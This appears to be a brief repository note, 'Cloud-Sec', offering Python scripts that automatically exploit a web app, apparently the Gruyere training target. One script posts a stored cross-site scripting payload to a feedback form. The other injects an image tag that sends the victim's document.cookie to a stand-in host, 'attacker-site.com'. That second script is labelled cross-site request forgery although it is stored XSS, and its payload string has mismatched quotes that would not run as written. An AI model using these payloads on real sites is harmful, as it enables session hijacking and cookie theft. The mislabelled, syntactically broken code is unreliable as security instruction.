# Cloud-Sec
create code that can automatically exploit its documented vulnerabilities.

**Python Code for Cross-Site Scripting**

import requests
payload = "<script>alert('XSS Attack!');</script>" 
document_id = "your-document-id"
url = f"http://gruyere-app.com/feedback?id={document_id}" 
data = {"feedback": payload} 
response = requests.post(url, data=data)
print(response.text)

**Python Code for Cross-Site Request Forgery**

import requests
payload = '<img src="http://attacker-site.com/steal?cookie=" + document.cookie + '">';' 
url = "http://gruyere-app.com/settings" 
data = {"description": payload} 
response = requests.post(url, data=data)
print(response.text)
  
